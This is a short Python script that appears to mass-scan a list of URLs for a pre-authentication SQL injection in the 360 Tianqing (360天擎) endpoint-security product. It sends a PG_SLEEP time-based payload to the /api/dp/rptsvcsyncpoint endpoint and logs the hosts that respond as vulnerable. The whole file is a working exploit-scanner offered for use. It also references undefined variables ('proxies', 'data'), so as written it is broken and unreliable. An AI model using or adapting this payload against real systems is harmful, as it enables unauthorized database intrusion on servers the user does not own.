import requests
import time

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0"
}

for url in open("360天擎.txt"):
    try:
        url = url.replace("\n", "")
        print(url+"检测中----\n\n")
        jiaoyan = requests.get(url+"/api/dp/rptsvcsyncpoint?ccid=1';SELECT PG_SLEEP(5)-- ", proxies=proxies, headers=headers, data=data, verify=False, timeout=5) 
    except requests.exceptions.Timeout:
        jiaoyan2 = requests.get(url, headers=headers, data=data, verify=False, timeout=5) 
        if(jiaoyan2.status_code == 200):
            with open("360天擎 rptsvcsyncpoint 前台SQL vul.txt", "a+") as f:
                    f.write(url+"\n")
    except:
        continue

